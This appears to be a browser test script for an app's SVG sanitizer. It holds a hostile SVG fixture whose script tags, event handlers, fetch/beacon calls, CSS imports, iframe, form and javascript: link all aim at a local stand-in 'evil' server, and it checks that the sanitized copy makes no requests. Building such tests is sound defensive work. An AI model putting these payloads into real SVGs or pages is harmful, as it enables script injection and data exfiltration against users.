// Real-browser check for the SVG sanitizer (plan 2.6). A hostile SVG tries every way out; the sanitizer's output is loaded in the browser next to it,
// first as an <img> (the way the app shows it) and then, harder, as a top-level DOCUMENT, where a script or a request WOULD run. A local "evil" server
// that every attempt points at must see zero requests from the sanitized copy, and the hostile original must be seen to reach it (the control).
// It also draws a full skill page's sanitized copy to a canvas to show that its look (CSS variables, background) survived.
// Run: BATCH2A_OUTPUT=<folder outside the repo> node check/svg-sanitize.mjs
import assert from 'node:assert/strict';
import http from 'node:http';
import path from 'node:path';
import { chromium } from 'playwright-core';
import { sanitizeSvgDocument } from '../shared/svg-sanitize.ts';
import { PAGE } from '../test/fixtures/skill-page.ts';

const out = path.resolve(process.env.BATCH2A_OUTPUT ?? '');
assert(process.env.BATCH2A_OUTPUT && !out.toLowerCase().startsWith(path.resolve('..').toLowerCase()), 'Output must be outside the repo');
const hits = []; const evil = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'content-type': 'image/svg+xml' }); res.end('<svg xmlns="http://www.w3.org/2000/svg"/>'); });
await new Promise((r) => evil.listen(0, '127.0.0.1', r));
const E = 'http://127.0.0.1:' + evil.address().port;
const HOSTILE = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="240" height="90" viewBox="0 0 240 90" onload="document.title='ran-onload';fetch('${E}/onload')">
<style>@import url(${E}/import); .a{fill:url(${E}/css-fill)} .b{fill:#2e6654;stroke:#111}</style>
<script>document.title='ran-script';fetch('${E}/fetch');new Image().src='${E}/img-js';navigator.sendBeacon('${E}/beacon','x');</script>
<image href="${E}/image" width="9" height="9"/><image xlink:href="${E}/image-x" width="9" height="9"/><use href="${E}/use.svg#a"/>
<foreignObject width="50" height="50"><iframe xmlns="http://www.w3.org/1999/xhtml" src="${E}/iframe"></iframe><form xmlns="http://www.w3.org/1999/xhtml" action="${E}/form"><input name="a"/></form></foreignObject>
<a href="javascript:document.title='ran-link'"><rect class="b" x="10" y="10" width="100" height="50" rx="6" onclick="fetch('${E}/click')"/></a>
<animate attributeName="x" to="9"/><set attributeName="onload" to="alert(1)"/>
<text x="20" y="40" font-size="14" fill="#fff">Diagram</text></svg>`;
const clean = sanitizeSvgDocument(HOSTILE); assert(clean.ok, 'the hostile svg is still a drawing: ' + JSON.stringify(clean));
const page = sanitizeSvgDocument(PAGE); assert(page.ok, 'the skill page yields a drawing');
assert(!/script|onload|onclick|foreignObject|<image|<use|<a[ >]|iframe|animate|<set|href|javascript|@import|evil|127\.0\.0\.1/i.test(clean.svg), 'sanitized text has none of it: ' + clean.svg);

const site = http.createServer((req, res) => {
  const send = (type, body) => { res.writeHead(200, { 'content-type': type }); res.end(body); };
  if (req.url === '/hostile.svg') return send('image/svg+xml', HOSTILE);
  if (req.url === '/sanitized.svg') return send('image/svg+xml', clean.svg);
  if (req.url === '/page.svg') return send('image/svg+xml', page.svg);
  if (req.url === '/beside') return send('text/html', '<!doctype html><body style="margin:16px;background:#1b150f;color:#ddd;font:14px system-ui"><p>Hostile original (as an image) and sanitized copy (as an image)</p><img id="h" src="/hostile.svg"> <img id="s" src="/sanitized.svg" style="background:#1b150f"> <img id="p" src="/page.svg" width="400"></body>');
  send('text/plain', 'x');
});
await new Promise((r) => site.listen(0, '127.0.0.1', r));
const S = 'http://127.0.0.1:' + site.address().port;
let browser; const report = {};
try {
  browser = await chromium.launch({ channel: 'msedge', headless: true });
  const open = async (url, wait = 2500) => { const p = await browser.newPage({ viewport: { width: 1100, height: 420 } }); await p.goto(url); await p.waitForTimeout(wait); return p; };

  // 1. Control: the hostile original opened as a document runs its script and reaches the evil server. So the evil server can see requests.
  let p = await open(S + '/hostile.svg'); assert.match(await p.title(), /^ran-/, 'control: the hostile script runs when opened as a document');
  report.controlHits = hits.length; assert(hits.length > 0, 'control: the hostile original reaches the evil server'); hits.length = 0; await p.close();

  // 2. The sanitized copy opened as a DOCUMENT (where scripts and requests would run) is inert.
  p = await open(S + '/sanitized.svg'); assert.notEqual(await p.title(), 'ran-script'); assert.notEqual(await p.title(), 'ran-onload'); assert.equal(await p.title(), '');
  assert.deepEqual(hits, [], 'sanitized, opened as a document: the evil server saw nothing: ' + hits.join(', '));
  const inventory = await p.evaluate(() => ({ bad: document.querySelectorAll('script,foreignObject,image,use,a,iframe,object,embed,animate,set,form,input').length,
    handlers: [...document.querySelectorAll('*')].flatMap((e) => [...e.attributes].filter((a) => /^on/i.test(a.name))).length,
    hrefs: [...document.querySelectorAll('*')].flatMap((e) => [...e.attributes].filter((a) => /href/i.test(a.name))).length,
    rects: document.querySelectorAll('rect').length, texts: [...document.querySelectorAll('text')].map((t) => t.textContent), root: document.documentElement.namespaceURI }));
  assert.deepEqual({ ...inventory, texts: undefined }, { bad: 0, handlers: 0, hrefs: 0, rects: 1, texts: undefined, root: 'http://www.w3.org/2000/svg' }, JSON.stringify(inventory)); assert.deepEqual(inventory.texts, ['Diagram']);
  await p.close();

  // 3. The way the app shows it: as images, side by side. Both load; neither reaches the evil server; the sanitized one keeps the drawing.
  p = await open(S + '/beside', 3000);
  const imgs = await p.evaluate(() => ['h', 's', 'p'].map((id) => { const i = document.getElementById(id); return { id, ok: i.complete && i.naturalWidth > 0, w: i.naturalWidth, h: i.naturalHeight }; }));
  assert(imgs.every((i) => i.ok), 'all three load as images (the sanitized output is well-formed): ' + JSON.stringify(imgs)); report.images = imgs;
  assert.deepEqual(hits, [], 'as images: the evil server saw nothing from either copy: ' + hits.join(', ')); assert.equal(await p.title(), '', 'no script ran');
  await p.screenshot({ path: path.join(out, 'svg-sanitize-beside.png') });

  // 4. The full skill page's look survived: the page background and the box outline (from CSS variables) are drawn.
  const px = await p.evaluate(async () => { const i = document.getElementById('p'); const c = document.createElement('canvas'); c.width = 400; c.height = 200; const x = c.getContext('2d'); x.drawImage(i, 0, 0, 400, 200);
    const at = (a, b) => [...x.getImageData(a, b, 1, 1).data]; return { paper: at(3, 3), inside: at(80, 70), edge: at(20, 90), arrow: at(200, 90) }; });
  report.pixels = px;
  assert.deepEqual(px.paper, [244, 239, 230, 255], 'the page background (#f4efe6, from --paper) is there'); assert.deepEqual(px.inside, [244, 239, 230, 255], 'the box fill is the paper colour');
  assert(px.edge[0] < 140 && px.edge[3] > 200, 'the box outline is drawn dark (from --ink): ' + px.edge);
  await p.close();
  console.log(JSON.stringify({ passed: true, ...report }, null, 1));
} finally { await browser?.close(); evil.close(); site.close(); }
